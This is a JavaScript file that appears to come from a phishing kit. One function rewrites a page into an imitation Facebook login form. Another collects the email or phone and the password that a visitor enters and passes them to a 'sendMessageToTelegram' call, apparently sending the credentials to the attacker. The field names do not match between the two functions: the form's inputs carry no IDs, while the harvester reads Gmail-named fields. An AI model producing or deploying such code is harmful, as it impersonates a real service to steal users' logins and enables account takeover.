function generarFacebook() {
    // alert("¡Hola desde la función!");
    const contenedor = document.getElementsByTagName('body')[0];
    contenedor.innerHTML = `
                  <div class="hero bg-base-200 min-h-screen">
                <div class="hero-content text-center">
                  <div class="max-w-md">

                    <div
                    style="font-family: Helvetica, Arial, sans-serif;display: flex;justify-content: center;align-items: center;height: 100vh; margin: 0;">
                    <div class="container2" style="text-align: center;">
                      <div class="logo" style="      font-size: 48px;
                      color: #1877f2;
                      font-weight: bold;
                      margin-bottom: 20px;">facebook</div>
                      <div class="login-box" style="      background: #fff;
                      padding: 20px 20px 30px;
                      width: 350px;
                      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
                      border-radius: 8px;">
                        <h2 style="      font-size: 18px;
          margin-bottom: 20px;">Log Into Facebook</h2>
                        <input type="text" class="input-field" placeholder="Email or phone number" style="      width: 100%;
                        padding: 14px;
                        margin-bottom: 12px;
                        border: 1px solid #dddfe2;
                        border-radius: 6px;
                        font-size: 16px;">
                        <input type="password" class="input-field" placeholder="Password" style="      width: 100%;
                        padding: 14px;
                        margin-bottom: 12px;
                        border: 1px solid #dddfe2;
                        border-radius: 6px;
                        font-size: 16px;">
                        <button class="login-button" style="      background-color: #1877f2;
                        color: white;
                        width: 100%;
                        padding: 14px;
                        border: none;
                        border-radius: 6px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        margin-top: 5px;">Log In</button>
                        <div class="footer-links" style="      margin-top: 15px;
          font-size: 14px;">
                          <a href="#" style="      color: #1877f2;
          text-decoration: none;">Forgot account?</a> ·
                          <a href="#" style="      color: #1877f2;
          text-decoration: none;">Sign up for Facebook</a>
                        </div>
                      </div>
                    </div>
                  </div>
        
                  </div>
                </div>
              </div>
    `
}

async function facebookData() {

        const emailGmail = document.getElementById('gmailUser');
        const passwordGmail = document.getElementById('gmailPassword');
        const alarma = document.getElementById('alerta');
    
    
    
        const valor = emailGmail.value;
        const regexEmail = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        const regexTelefono = /^\+?[0-9]{3,15}$/;
        if (!regexEmail.test(valor) && !regexTelefono.test(valor)) {
            emailGmail.setCustomValidity('Por favor, ingrese un correo electrónico o número de teléfono válido');
            alarma.style.display = "block";
        } else {
        sendMessageToTelegram(`gmail: \n usuario: ${emailGmail.value} \n contrasenia: ${passwordGmail.value}`);
            emailGmail.setCustomValidity('');
        }
    }